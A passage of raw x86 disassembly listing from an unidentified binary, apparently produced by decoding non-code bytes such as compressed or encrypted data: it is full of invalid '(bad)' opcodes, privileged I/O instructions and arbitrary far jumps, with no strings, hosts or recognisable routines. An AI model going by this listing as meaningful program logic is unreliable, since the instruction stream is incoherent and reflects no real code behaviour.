  411fce:	and    dl,BYTE PTR [esi-0x48]
  411fd1:	shl    DWORD PTR [edx-0x444f8721],0x60
  411fd8:	dec    edi
  411fd9:	cmp    bh,bh
  411fdb:	push   edi
  411fdc:	sti    
  411fdd:	or     DWORD PTR [esi+ecx*1+0x5],edx
  411fe1:	pop    ss
  411fe2:	aas    
  411fe3:	jle    0x411fea
  411fe5:	jo     0x411f7a
  411fe7:	xor    al,bl
  411fe9:	shl    al,0x53
  411fec:	push   ss
  411fed:	pop    ds
  411fee:	loopne 0x412029
  411ff0:	imul   esi,ecx,0xfffffff4
  411ff3:	lahf   
  411ff4:	mov    ah,BYTE PTR [edi+0x549a9198]
  411ffa:	push   esi
  411ffb:	je     0x411fb5
  411ffd:	loopne 0x412002
  411fff:	xor    eax,0xebfd0938
  412004:	inc    ebp
  412005:	fld    TBYTE PTR [ecx+0x7e]
  412008:	mov    edi,0x38ffc6dd
  41200d:	dec    ebx
  41200e:	cdq    
  41200f:	or     eax,0x25ca1dd4
  412014:	or     BYTE PTR [edi+0x24],0x33
  412018:	mov    BYTE PTR [ecx],dl
  41201a:	rcr    edi,0x63
  41201d:	retf   0x7e0e
  412020:	pop    esi
  412021:	cwde   
  412022:	outs   dx,BYTE PTR ds:[esi]
  412023:	leave  
  412024:	add    DWORD PTR ds:0xed0536ea,0xf5c1680e
  41202e:	jns    0x412020
  412030:	aas    
  412031:	fisub  DWORD PTR ds:[eax+0x5f]
  412035:	jge    0x412089
  412037:	mov    cl,0xb3
  412039:	jle    0x412023
  41203b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41203c:	adc    edx,edi
  41203e:	mov    esi,0xd27bbb8
  412043:	push   ebx
  412044:	jnp    0x411fec
  412046:	(bad)  
  412048:	add    DWORD PTR ds:0xe4280a26,ebx
  41204e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41204f:	nop
  412050:	cmp    dl,BYTE PTR [ecx+0x68]
  412053:	cs mov ecx,0x558ef8dd
  412059:	cmp    dl,BYTE PTR [ebx]
  41205b:	(bad)  
  41205c:	xor    esp,ecx
  41205e:	jp     0x4120a9
  412060:	sbb    edi,DWORD PTR [edi-0x1]
  412063:	das    
  412064:	mov    ah,0x61
  412066:	(bad)  
  412067:	lock or ch,BYTE PTR [edx+0x4f]
  41206b:	outs   dx,BYTE PTR ds:[esi]
  41206c:	shl    BYTE PTR [edx+0x6413b8b],cl
  412072:	xor    BYTE PTR [edi],cl
  412074:	rcr    esp,cl
  412076:	lahf   
  412077:	mov    bl,0xad
  412079:	cmp    ebp,DWORD PTR [ebp+0x79fd6850]
  41207f:	out    dx,eax
  412080:	xchg   ecx,eax
  412081:	jb     0x412102
  412083:	and    eax,0xcd73d151
  412088:	stos   BYTE PTR es:[edi],al
  412089:	mov    esi,0x697a087d
  41208e:	push   es
  41208f:	inc    eax
  412090:	or     al,BYTE PTR [eax]
  412092:	or     al,0x36
  412094:	clc    
  412095:	(bad)  
  412096:	icebp  
  412097:	and    esp,DWORD PTR [edx-0x76]
  41209a:	(bad)  
  41209b:	mov    ecx,0x71358e48
  4120a0:	shr    BYTE PTR [esi+0x6726d338],0xd7
  4120a7:	popf   
  4120a8:	int3   
  4120a9:	in     eax,0x61
  4120ab:	vpcmpeqw xmm7,xmm3,XMMWORD PTR [edx]
  4120af:	mov    ebp,0x9ee0d3cc
  4120b4:	mov    ebx,esp
  4120b6:	(bad)  
  4120b7:	int3   
  4120b8:	mov    al,bl
  4120ba:	adc    al,0xa3
  4120bc:	inc    ebp
  4120bd:	ja     0x4120b6
  4120bf:	fldenv [edi-0x60ba5a74]
  4120c5:	ds inc ebp
  4120c7:	popf   
  4120c8:	lds    ebx,FWORD PTR [edx]
  4120ca:	mul    al
  4120cc:	add    DWORD PTR [ebp+0x65],edi
  4120cf:	test   al,0x7
  4120d1:	not    BYTE PTR [edi+0x60]
  4120d4:	scas   eax,DWORD PTR es:[edi]
  4120d5:	rol    edi,0x30
  4120d8:	inc    edi
  4120d9:	les    ebx,FWORD PTR [eax]
  4120db:	dec    ebp
  4120dc:	(bad)  
  4120dd:	jecxz  0x4120d8
  4120df:	mov    al,0xf9
  4120e1:	mov    BYTE PTR [eax+0x11],bh
  4120e4:	int    0x4d
  4120e6:	dec    edx
  4120e7:	ror    bh,1
  4120e9:	push   ebp
  4120ea:	out    0xd2,al
  4120ec:	ins    DWORD PTR es:[edi],dx
  4120ed:	mov    bh,0x5a
  4120ef:	(bad)  [eax]
  4120f1:	test   al,0xca
  4120f3:	retf   
  4120f4:	mov    ah,0xb5
  4120f6:	sbb    al,0x13
  4120f8:	shr    al,1
  4120fa:	(bad)  
  4120fb:	lods   al,BYTE PTR ds:[esi]
  4120fc:	pop    ebp
  4120fd:	mov    BYTE PTR [ebx+0x44f47331],cl
  412103:	cdq    
  412104:	jmp    0xde0d:0x1e653038
  41210b:	imul   dh
  41210d:	sti    
  41210e:	pop    eax
  41210f:	icebp  
  412110:	jb     0x41214f
  412112:	sub    DWORD PTR [ecx-0x64657450],0x12
  412119:	jae    0x4120c5
  41211b:	mov    bl,0x9c
  41211d:	dec    esi
  41211e:	xor    al,0x78
  412120:	adc    ax,0x6a3b
  412124:	clc    
  412125:	and    eax,0xc71964c4
  41212a:	std    
  41212b:	pop    esp
  41212c:	xor    al,0xe2
  41212e:	outs   dx,DWORD PTR ds:[esi]
  41212f:	mov    ds:0x1991d214,eax
  412134:	test   eax,0x5995de91
  41213a:	inc    eax
  41213b:	and    eax,0x9c11d3a6
  412140:	jecxz  0x412120
  412142:	inc    ebp
  412143:	add    esi,0x55
  412146:	jl     0x4121b6
  412148:	mov    ebp,DWORD PTR [ebp-0xf8938a5]
  41214e:	adc    BYTE PTR ds:0xf80fcd41,0x65
  412155:	sti    
  412156:	inc    ecx
  412157:	or     ah,bh
  412159:	jo     0x4120f6
  41215b:	push   es
  41215c:	push   esp
  41215d:	cmp    DWORD PTR [ebx],0x86a416e4
  412163:	mov    esi,0x97da396b
  412168:	dec    ebx
  412169:	mov    edx,DWORD PTR [ebx-0x13ba05fa]
  41216f:	out    0x4e,eax
  412171:	stc    
  412172:	ds push edi
  412174:	xchg   ebx,eax
  412175:	inc    ebp
  412176:	fisubr DWORD PTR [esi-0x39]
  412179:	outs   dx,BYTE PTR ds:[esi]
  41217a:	jle    0x412111
  41217c:	mov    WORD PTR [ecx+0x361ad6da],fs
  412182:	mov    esp,0x615a1a90
  412187:	mov    WORD PTR [ebx+ebx*8+0x611bb3f0],ds
  41218e:	dec    esi
  41218f:	in     eax,dx
  412190:	xor    eax,0x600d3a48
  412195:	loop   0x412167
  412197:	mov    gs,esi
  412199:	loopne 0x4121fe
  41219b:	mov    BYTE PTR [ecx+0x78b96887],bl
  4121a1:	pop    ds
  4121a2:	scas   al,BYTE PTR es:[edi]
  4121a3:	fiadd  DWORD PTR [bx+di-0x1962]
  4121a8:	test   eax,0xe705aeec
  4121ad:	add    eax,0x932b9a67
  4121b2:	jns    0x412188
  4121b4:	adc    ch,bh
  4121b6:	adc    bh,cl
  4121b8:	cdq    
  4121b9:	ja     0x412163
  4121bb:	adc    bh,BYTE PTR ds:0x116d6444
  4121c1:	leave  
  4121c2:	sbb    al,0x4d
  4121c4:	mov    bh,0x27
  4121c6:	mov    eax,ds:0x6a0a3b79
  4121cb:	dec    ebx
  4121cc:	dec    ebx
  4121cd:	jb     0x41223a
  4121cf:	pushf  
  4121d0:	cmp    DWORD PTR [esi+0x3c],ebp
  4121d3:	inc    edi
  4121d4:	out    dx,eax
  4121d5:	jno    0x412176
  4121d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121d8:	cmp    eax,0xae36eafa
  4121dd:	pop    eax
  4121de:	xlat   BYTE PTR ds:[ebx]
  4121df:	push   0xd3777d90
  4121e4:	loopne 0x41216c
  4121e6:	or     ah,BYTE PTR [edi-0x236a39fa]
  4121ec:	sub    ebx,eax
  4121ee:	es sbb eax,0x6d6222d1
  4121f4:	iret   
  4121f5:	(bad)  
  4121f6:	pop    ss
  4121f7:	cmp    eax,0x786d0438
  4121fc:	fiadd  WORD PTR [esi-0x33]
  4121ff:	iret   
  412200:	add    esi,eax
  412202:	fsub   DWORD PTR [ecx]
  412204:	inc    ebx
  412205:	ja     0x4121a4
  412207:	xlat   BYTE PTR ds:[ebx]
  412208:	sub    eax,0xffffffa8
  41220b:	and    BYTE PTR [eax],al
  41220d:	cld    
  41220e:	sar    edx,1
  412210:	jg     0x4121c2
  412212:	push   esp
  412213:	inc    esp
  412214:	or     DWORD PTR [ecx+0x70084c16],esp
  41221a:	imul   esi,DWORD PTR [esi],0x6e
  41221d:	jae    0x4121a0
  41221f:	dec    eax
  412220:	mov    dh,0x67
  412222:	fs cs mov ebp,fs
  412226:	in     eax,dx
  412227:	iret   
  412228:	mov    al,0xac
  41222a:	adc    al,0x24
  41222c:	xchg   ecx,eax
  41222d:	loopne 0x4121f6
  41222f:	cmp    dl,0xa8
  412232:	mov    ch,0x37
  412234:	repnz das 
  412236:	push   es
  412237:	jno    0x412222
  412239:	adc    DWORD PTR [eax+edx*1],0xc72a407b
  412240:	jl     0x41224b
  412242:	lods   eax,DWORD PTR ds:[esi]
  412243:	mov    BYTE PTR [ebx-0x14],0xa
  412247:	cmp    BYTE PTR [ecx],0x76
  41224a:	ds ins BYTE PTR es:[edi],dx
  41224c:	cwde   
  41224d:	mov    eax,ds:0x271f1749
  412252:	jbe    0x4122a6
  412254:	aam    0xcd
  412256:	fldln2 
  412258:	std    
  412259:	jle    0x4121e6
  41225b:	aaa    
  41225c:	in     al,0x74
  41225e:	leave  
  41225f:	push   0x714d56a7
  412264:	scas   eax,DWORD PTR es:[edi]
  412265:	mov    ah,0xac
  412267:	fisubr DWORD PTR [ebx]
  412269:	xor    eax,0xd0961316
  41226e:	add    al,0x2a
  412270:	adc    DWORD PTR [ecx],eax
  412272:	pop    edx
  412273:	ror    edi,0xe9
  412276:	pushf  
  412277:	sub    dl,bl
  412279:	inc    eax
  41227a:	pop    esp
  41227b:	out    0x26,eax
  41227d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41227e:	jp     0x4122f9
  412280:	add    eax,0x3aa435dc
  412285:	cdq    
  412286:	imul   ebx,DWORD PTR [edi],0xfffffff8
  412289:	sub    ebp,DWORD PTR [esp+esi*2-0x74607f50]
  412290:	adc    eax,0xbd45426b
  412295:	cmc    
  412296:	sbb    al,0xe3
  412298:	pop    ebp
  412299:	loopne 0x412240
  41229b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41229c:	loopne 0x4122c7
  41229e:	xor    al,0xe2
  4122a0:	mov    edi,0xca922b5e
  4122a5:	mov    edx,0xbdd47799
  4122aa:	mov    bh,0xe8
  4122ac:	xor    eax,0x17e1edb6
  4122b1:	ins    BYTE PTR es:[edi],dx
  4122b2:	xor    ah,BYTE PTR [esi]
  4122b4:	std    
  4122b5:	sub    al,0x64
  4122b7:	pusha  
  4122b8:	cli    
  4122b9:	sub    eax,0x18a03289
  4122be:	add    dl,al
  4122c0:	out    dx,eax
  4122c1:	mov    ebx,DWORD PTR [edi]
  4122c3:	xchg   ecx,eax
  4122c4:	iret   
  4122c5:	(bad)  
  4122c6:	mov    ah,0xcd
  4122c8:	imul   ebp,DWORD PTR [edx-0x1f],0x18
  4122cc:	mov    dl,0x27
  4122ce:	lods   al,BYTE PTR ds:[esi]
  4122cf:	das    
  4122d0:	lahf   
  4122d1:	push   0xc9b6dd35
  4122d6:	or     DWORD PTR [edi-0x1faea1c8],esi
  4122dc:	test   DWORD PTR [edx-0x6a0fcb8f],0x59bfe9b4
  4122e6:	push   esi
  4122e7:	add    DWORD PTR [edx+0x4b88f76e],ebp
  4122ed:	ins    BYTE PTR es:[edi],dx
  4122ee:	pop    edi
  4122ef:	lahf   
  4122f0:	or     bh,bh
  4122f2:	or     DWORD PTR [ebx-0x31ede100],esp
  4122f8:	mov    edi,0x92de78ed
  4122fd:	add    eax,0xcc72e8e2
  412302:	lahf   
  412303:	pop    ss
  412304:	push   edx
  412305:	int3   
  412306:	rcr    BYTE PTR [ebx],cl
  412308:	cwde   
  412309:	das    
  41230a:	jmp    0x41232a
  41230c:	push   edi
  41230d:	cmp    eax,0x5c4fc307
  412312:	inc    esp
  412313:	sub    eax,DWORD PTR [eax-0x1]
  412316:	sahf   
  412317:	stc    
  412318:	clc    
  412319:	cmp    DWORD PTR [edi+0x27],0x149ca76
  412320:	mov    WORD PTR [eax-0x6f],cs
  412323:	das    
  412324:	add    edx,DWORD PTR [esi+0x8]
  412327:	je     0x41231f
  412329:	loop   0x41235b
  41232b:	int3   
  41232c:	punpckhbw mm3,QWORD PTR [ebx+0x41]
  412330:	inc    eax
  412331:	popf   
  412332:	mov    dh,0x59
  412334:	pop    ebp
  412335:	xlat   BYTE PTR ds:[ebx]
  412336:	inc    edi
  412337:	mov    ds:0xf2a425d3,eax
  41233c:	jnp    0x412341
  41233e:	pop    ecx
  41233f:	jmp    0x6b9f50ad
  412344:	push   0x852e5873
  412349:	aaa    
  41234a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41234b:	mov    dh,0x2e
  41234d:	pop    ds
  41234e:	jb     0x412371
  412350:	sar    BYTE PTR [edi],1
  412352:	fild   WORD PTR [esi+eax*2+0x4dbc6892]
  412359:	js     0x4123b2
  41235b:	fild   QWORD PTR [edx+0x17cdd568]
  412361:	mov    ds:0x708fc064,al
  412366:	add    DWORD PTR [ecx+0x40b1fe57],edi
  41236c:	mov    bl,0x7a
  41236e:	aam    0x44
  412370:	dec    eax
  412371:	jae    0x41235c
  412373:	sar    DWORD PTR [ebx+0x1352aa7e],1
  412379:	adc    ch,BYTE PTR ds:0x68db95d9
  41237f:	lock jecxz 0x4123ea
  412382:	(bad)  
  412383:	xchg   edx,eax
  412384:	retf   0x50fc
  412387:	ja     0x4123b6
  412389:	test   eax,0x78f302b8
  41238e:	push   ecx
  41238f:	popa   
  412390:	mov    ds:0xcbfac4b,eax
  412395:	sbb    eax,DWORD PTR [ecx+0x5b88185a]
  41239b:	xlat   BYTE PTR ds:[ebx]
  41239c:	jnp    0x4123c2
  41239e:	adc    BYTE PTR [esi+edx*2+0x9e72246],bl
  4123a5:	sub    bh,BYTE PTR [ecx]
  4123a7:	call   0xebd9a431
  4123ac:	jo     0x412410
  4123ae:	push   ss
  4123af:	into   
  4123b0:	sub    bl,dl
  4123b2:	jae    0x4123cd
  4123b4:	aad    0xa1
  4123b6:	push   es
  4123b7:	mov    edi,0xf816beae
  4123bc:	loop   0x4123c6
  4123be:	xlat   BYTE PTR ds:[ebx]
  4123bf:	jb     0x412380
  4123c1:	(bad)  
  4123c2:	aaa    
  4123c3:	das    
  4123c4:	imul   ebx,DWORD PTR [eax-0x6d9df821],0x60fa20a6
  4123ce:	pop    eax
  4123cf:	dec    ebx
  4123d0:	fdiv   st(2),st
  4123d2:	xchg   ebx,eax
  4123d3:	aas    
  4123d4:	pop    edx
  4123d5:	lods   eax,DWORD PTR ds:[esi]
  4123d6:	leave  
  4123d7:	adc    DWORD PTR [ecx],ecx
  4123d9:	and    BYTE PTR [edi+0x4d],ah
  4123dc:	das    
  4123dd:	add    esi,DWORD PTR [edx-0x37]
  4123e0:	sbb    DWORD PTR [ecx+0x55],0x41
  4123e4:	imul   DWORD PTR [ebx]
  4123e6:	jbe    0x4123bd
  4123e8:	sbb    edx,DWORD PTR [edi+0x589877a3]
  4123ee:	xor    bh,dl
  4123f0:	xchg   edx,eax
  4123f1:	push   ds
  4123f2:	repz mov eax,0x7b3b7f54
  4123f8:	inc    ebp
  4123f9:	sub    cl,ah
  4123fb:	je     0x412400
  4123fd:	test   eax,0xcc1df533
  412402:	xadd   BYTE PTR [ebx],dh
  412405:	adc    al,0xd3
  412407:	lds    edi,FWORD PTR [ebp-0x1cbf6d7e]
  41240d:	arpl   WORD PTR [edx+0x2c],dx
  412410:	daa    
  412411:	jg     0x41242f
  412413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412414:	jge    0x412481
  412416:	push   ecx
  412417:	bound  edi,QWORD PTR [edx]
  412419:	push   0x45ae1fa0
  41241e:	ret    
  41241f:	stos   BYTE PTR es:[edi],al
  412420:	shr    BYTE PTR [ebp-0xd353936],cl
  412426:	pop    ebp
  412427:	pop    es
  412428:	out    0xd8,al
  41242a:	push   eax
  41242b:	xor    eax,0x613d5c6e
  412430:	xor    al,0x5d
  412432:	(bad)  
  412433:	pop    ecx
  412434:	ds inc esi
  412436:	sub    dh,bh
  412438:	ins    BYTE PTR es:[edi],dx
  412439:	sbb    BYTE PTR [edx+eax*2-0x3f],cl
  41243d:	or     BYTE PTR [eax+0x15],0x54
  412441:	xchg   ecx,eax
  412442:	das    
  412443:	shl    BYTE PTR [edi+0x75],0xb5
  412447:	xchg   al,bl
  412449:	sub    BYTE PTR [edi-0x2a],dh
  41244c:	clc    
  41244d:	add    ecx,DWORD PTR [ebx+0x12]
  412450:	or     dl,BYTE PTR [ebx-0x665bb46f]
  412456:	cmp    al,BYTE PTR [edi+0x1e777269]
  41245c:	jl     0x41240b
  41245e:	xlat   BYTE PTR ds:[ebx]
  41245f:	aad    0xd2
  412461:	sub    DWORD PTR [esi+edx*1],ecx
  412464:	and    dl,BYTE PTR [edx+0x73623c1d]
  41246a:	jg     0x412475
  41246c:	add    BYTE PTR [edx],ch
  41246e:	add    BYTE PTR [esi+0x79f1dfb6],ah
  412474:	dec    ebx
  412475:	fdiv   QWORD PTR [edx]
  412477:	sub    eax,DWORD PTR [ecx-0x100f889d]
  41247d:	sub    ebp,DWORD PTR [edi]
  41247f:	icebp  
  412480:	cmp    al,BYTE PTR [eax-0x16]
  412483:	and    BYTE PTR [bp+si],bh
  412486:	push   es
  412487:	ror    DWORD PTR [edx],1
  412489:	out    dx,eax
  41248a:	inc    edx
  41248b:	outs   dx,DWORD PTR ds:[esi]
  41248c:	test   eax,0x4cd44c4a
  412491:	sub    eax,0x524ee0cb
  412496:	sti    
  412497:	adc    DWORD PTR [ecx-0x77],0x7a7776c6
  41249e:	stc    
  41249f:	cli    
  4124a0:	pop    esp
  4124a1:	mov    eax,0xee5b537
  4124a6:	dec    esp
  4124a7:	or     eax,0xaf2c2a52
  4124ac:	push   ebp
  4124ad:	aaa    
  4124ae:	out    dx,al
  4124af:	aas    
  4124b0:	popa   
  4124b1:	and    esp,DWORD PTR [bx+si-0x4b]
  4124b5:	jbe    0x412496
  4124b7:	jecxz  0x412444
  4124b9:	jae    0x41251b
  4124bb:	into   
  4124bc:	jl     0x41245e
  4124be:	sub    DWORD PTR [ebx-0x7eba033b],edx
  4124c4:	or     al,0xb9
  4124c6:	pop    esi
  4124c7:	in     al,dx
  4124c8:	inc    edx
  4124c9:	std    
  4124ca:	les    ebp,FWORD PTR [edi]
  4124cc:	inc    ebx
  4124cd:	inc    edx
  4124ce:	dec    esi
  4124cf:	les    esp,FWORD PTR [edx+0x1b8360bb]
  4124d5:	pop    ecx
  4124d6:	fisub  DWORD PTR [ecx+0x79]
  4124d9:	push   ecx
  4124da:	xchg   BYTE PTR [edi-0x1d295ffb],dl
  4124e0:	mov    dl,0x4d
  4124e2:	mov    ebx,0xa1fb63f4
  4124e7:	jae    0x4124c8
  4124e9:	rcl    DWORD PTR [esp+ecx*8+0xa],0x44
  4124ee:	dec    edi
  4124ef:	mov    edx,0xe5bacd0b
  4124f4:	cmp    ebp,esp
  4124f6:	cmp    cl,al
  4124f8:	lahf   
  4124f9:	stos   BYTE PTR es:[edi],al
  4124fa:	or     ecx,ecx
  4124fc:	dec    esp
  4124fd:	sub    al,0x31
  4124ff:	leave  
  412500:	js     0x412488
  412502:	mov    ebp,0x4d94f024
  412507:	popf   
  412508:	and    al,BYTE PTR [ebx-0x7f0abfcb]
  41250e:	imul   ebp,esp,0xd10d2935
  412514:	xlat   BYTE PTR ds:[ebx]
  412515:	mov    WORD PTR ds:0x1626a99f,fs
  41251b:	fst    DWORD PTR [ecx-0x8c0440c]
  412521:	xchg   edi,eax
  412522:	in     eax,dx
  412523:	mov    dl,0xb9
  412525:	pop    ecx
  412526:	retf   0x8e9e
  412529:	sub    al,0x68
  41252b:	imul   esi,ecx,0xffffffde
  41252e:	mov    edx,0xb1e4c0ae
  412533:	add    eax,0xd7955def
  412538:	jns    0x41254f
  41253a:	addr16 jp 0x4124de
  41253d:	leave  
  41253e:	push   0xa8204657
  412543:	xchg   esi,eax
  412544:	jmp    0x3b94:0xe7f22933
  41254b:	and    ebp,0x4ba306d8
  412551:	pop    ecx
  412552:	or     BYTE PTR [ebp+0x7af51cff],bl
  412558:	retf   
  412559:	inc    ebx
  41255a:	loope  0x41253f
  41255c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41255d:	hlt    
  41255e:	fidivr DWORD PTR [ebp+0x4dd08409]
  412564:	ds adc eax,0x8890b273
  41256a:	imul   eax,ebp,0x44
  41256d:	inc    esp
  41256e:	in     eax,0x8f
  412570:	fimul  WORD PTR [edx+0x1b]
  412573:	js     0x41251f
  412575:	or     DWORD PTR [edx],eax
  412577:	add    DWORD PTR [ebx],edx
  412579:	retf   
  41257a:	dec    ebp
  41257b:	repz mov dh,0x23
  41257e:	adc    al,BYTE PTR [esi]
  412580:	sti    
  412581:	bound  edi,QWORD PTR [ebx+0x17]
  412584:	dec    esp
  412585:	mov    esp,?
  412587:	jae    0x41259a
  412589:	lahf   
  41258a:	dec    ebx
  41258b:	hlt    
  41258c:	and    al,BYTE PTR [esi+0x6085f2ef]
  412592:	ror    ah,0xe2
  412595:	clc    
  412596:	cmp    DWORD PTR ds:[esi+ebx*2],edx
  41259a:	mov    ecx,0x14fc5809
  41259f:	pop    eax
  4125a0:	je     0x41260f
  4125a2:	inc    esp
  4125a3:	int3   
  4125a4:	push   esi
  4125a5:	jbe    0x412598
  4125a7:	fs sbb eax,0xa12cb066
  4125ad:	adc    DWORD PTR [ebx],esp
  4125af:	inc    ebx
  4125b1:	outs   dx,DWORD PTR ds:[esi]
  4125b2:	dec    esi
  4125b3:	(bad)  
  4125b4:	cmc    
  4125b5:	pop    ecx
  4125b6:	adc    bh,dh
  4125b8:	stos   DWORD PTR es:[edi],eax
  4125b9:	lock fld QWORD PTR [ebp-0x1e9ecb7a]
  4125c0:	gs pop esp
  4125c2:	cmp    al,0x67
  4125c4:	xor    ecx,edx
  4125c6:	add    dh,BYTE PTR [eax]
  4125c8:	repnz pop ecx
  4125ca:	imul   esp,DWORD PTR [esi-0x1fafa8de],0x55d7d93a
  4125d4:	pop    edx
  4125d5:	pop    ecx
  4125d6:	inc    eax
  4125d7:	dec    ecx
  4125d8:	xor    eax,0x100e3429
  4125dd:	das    
  4125de:	lea    edx,[edx-0x1ed13c7b]
  4125e4:	rcr    BYTE PTR [ecx],1
  4125e6:	sti    
  4125e7:	push   0xffffffe7
  4125e9:	aad    0xa5
  4125eb:	push   ss
  4125ec:	cmp    eax,DWORD PTR [ebx-0x67]
  4125ef:	test   BYTE PTR [edx+0x53b9d019],bl
  4125f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125f6:	pop    edx
  4125f7:	out    dx,eax
  4125f8:	jmp    0x7284:0xf63fa21b
  4125ff:	fcmove st,st(5)
  412601:	jg     0x4125c4
  412603:	adc    BYTE PTR [edx],dh
  412605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412606:	stc    
  412607:	into   
  412608:	push   0xffffff92
  41260a:	mov    ebx,0x3ae4cbfd
  41260f:	pop    ebx
  412610:	cmp    esp,DWORD PTR [ecx+0x46]
  412613:	rol    DWORD PTR ds:0xabcf2e93,1
  412619:	add    eax,DWORD PTR [eax+ebx*2+0x368dac2c]
  412620:	gs je  0x4125a7
  412623:	mov    eax,ds:0x4b1761ef
  412628:	enter  0xd784,0x1a
  41262c:	fistp  DWORD PTR [edx-0x61]
  41262f:	dec    ebx
  412630:	add    BYTE PTR [edx-0x46],dh
  412633:	dec    edi
  412634:	in     al,dx
  412635:	pop    esp
  412636:	or     DWORD PTR fs:[eax],ecx
  412639:	iret   
  41263a:	sbb    DWORD PTR [eax+0x50dfbf61],edx
  412640:	sub    DWORD PTR [ecx+esi*2+0xe],eax
  412644:	int3   
  412645:	call   0x3b29:0x745387b
  41264c:	test   DWORD PTR [ecx+0x3570456d],esp
  412652:	test   BYTE PTR fs:[eax-0x65be9673],ch
  412659:	shld   DWORD PTR [ebx+0x58],esp,0x74
  41265e:	jbe    0x4125f1
  412660:	(bad)  
  412662:	(bad)  
  412663:	inc    edx
  412664:	sahf   
  412665:	idiv   BYTE PTR [edx-0x59375988]
  41266b:	repz push ebp
  41266d:	inc    ecx
  41266e:	jno    0x412638
  412670:	mov    ?,WORD PTR [ecx-0x3b]
  412673:	inc    esp
  412674:	fincstp 
  412676:	(bad)  
  412677:	fisttp WORD PTR [edi-0x2bb5e37b]
  41267d:	popa   
  41267e:	int    0x7f
  412680:	mov    bl,0xf6
  412682:	ins    DWORD PTR es:[edi],dx
  412683:	loope  0x412680
  412685:	or     DWORD PTR [ecx],esi
  412687:	lds    esi,FWORD PTR [ecx+0x1659c5c3]
  41268d:	xchg   esp,eax
  41268e:	das    
  41268f:	xchg   esi,eax
  412690:	fwait
  412691:	adc    esp,0x78
  412694:	xor    ebp,ebp
  412696:	fdivp  st(0),st
  412698:	ins    DWORD PTR es:[edi],dx
  412699:	mov    WORD PTR [ebx],es
  41269b:	mov    dh,0xbb
  41269d:	sahf   
  41269e:	repnz les edx,FWORD PTR [ecx+0x2b9d9d92]
  4126a5:	dec    bp
  4126a7:	in     al,dx
  4126a8:	test   esi,esp
  4126aa:	out    dx,eax
  4126ab:	mov    ebp,0x6bbafb80
  4126b0:	inc    ebp
  4126b1:	jno    0x4126d2
  4126b3:	rcr    dl,cl
  4126b5:	push   edx
  4126b6:	mov    bl,0xbd
  4126b8:	dec    ebp
  4126b9:	fst    DWORD PTR [edx+0x59]
  4126bc:	iret   
  4126bd:	cwde   
  4126be:	lods   al,BYTE PTR ds:[esi]
  4126bf:	mov    eax,0xc1158ab3
  4126c4:	bound  ebx,QWORD PTR [ebp-0x72347161]
  4126ca:	test   bh,ah
  4126cc:	fdivr  st(0),st
  4126ce:	jmp    0x412653
  4126d0:	adc    BYTE PTR [edi+0x4d55e0eb],bl
  4126d6:	jle    0x41272d
  4126d8:	xchg   esi,eax
  4126d9:	aad    0x17
  4126db:	jmp    0x412710
  4126dd:	cmc    
  4126de:	xchg   ebp,eax
  4126df:	mov    bl,0x2d
  4126e1:	popa   
  4126e2:	in     al,0x37
  4126e4:	mov    al,ds:0x8e2b635e
  4126e9:	xor    DWORD PTR ds:0xa861e063,esp
  4126ef:	in     eax,dx
  4126f0:	sub    eax,0x2d5eae0
  4126f5:	cmp    cl,al
  4126f7:	ja     0x412752
  4126f9:	popa   
  4126fa:	gs push es
  4126fc:	push   edi
  4126fd:	pop    ebx
  4126fe:	mov    ah,0x61
  412700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412701:	sub    BYTE PTR [eax+0x130d3bc0],dl
  412707:	std    
  412708:	mov    bh,0x77
  41270a:	add    eax,0x1843f178
  41270f:	sub    eax,0xf29d4e4e
  412714:	sub    ecx,esi
  412716:	das    
  412717:	mov    ecx,0xd6f750eb
  41271c:	cs hlt 
  41271e:	std    
  41271f:	and    eax,0x1bb99f8e
  412724:	popf   
  412725:	sub    al,0x9d
  412727:	xchg   esi,eax
  412728:	pop    esp
  412729:	aad    0xca
  41272b:	cdq    
  41272c:	jnp    0x412753
  41272e:	mov    al,0x71
  412730:	cdq    
  412731:	sbb    ebp,DWORD PTR [eax]
  412733:	fsubr  st,st(0)
  412735:	mov    ecx,0x946a7c3a
  41273a:	dec    edi
  41273b:	mov    dh,0x61
  41273d:	xor    al,0x88
  41273f:	ret    
  412740:	sub    DWORD PTR [esi+0x7b],ebp
  412743:	mov    esp,0xff2e0b05
  412748:	aam    0x80
  41274a:	dec    edx
  41274b:	mov    ecx,0xcec38
  412750:	lock and DWORD PTR [di],eax
  412754:	mov    dh,0x43
  412756:	fwait
  412757:	test   DWORD PTR [edi+0x1ebdf35a],esp
  41275d:	shl    eax,0xc6
  412760:	sbb    cl,BYTE PTR [edx+0x1d390782]
  412766:	stos   DWORD PTR es:[edi],eax
  412767:	dec    eax
  412768:	mov    ebx,0x2b6bdeab
  41276d:	cwde   
  41276e:	call   0x8912b189
  412773:	push   ebx
  412774:	mov    ch,BYTE PTR [esi+eax*8-0x2a059ba3]
  41277b:	dec    ebp
  41277c:	int3   
  41277d:	stos   BYTE PTR es:[edi],al
  41277e:	jbe    0x4127c1
  412780:	arpl   di,bx
  412782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412783:	ss mov dh,0x3b
  412786:	push   eax
  412787:	cmp    bl,BYTE PTR [ecx]
  412789:	aad    0x42
  41278b:	test   BYTE PTR [esi+0x5a],bl
  41278e:	and    ch,BYTE PTR [esi-0x4e46d8a8]
  412794:	add    ebp,DWORD PTR [ecx+0x6]
  412797:	fs sbb al,0x5b
  41279a:	sbb    DWORD PTR [ecx-0x5abbc74f],0x35
  4127a1:	inc    esp
  4127a2:	call   0xa7b1:0xfb2a0d3a
  4127a9:	or     edx,esp
  4127ab:	outs   dx,BYTE PTR ds:[esi]
  4127ac:	pop    edi
  4127ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127ae:	fs ja  0x41275c
  4127b1:	inc    eax
  4127b2:	and    esi,0xa092ca25
  4127b8:	fidivr DWORD PTR [edi-0x36e22c]
  4127be:	mov    al,ds:0xa2b7cdaf
  4127c3:	sbb    cl,dh
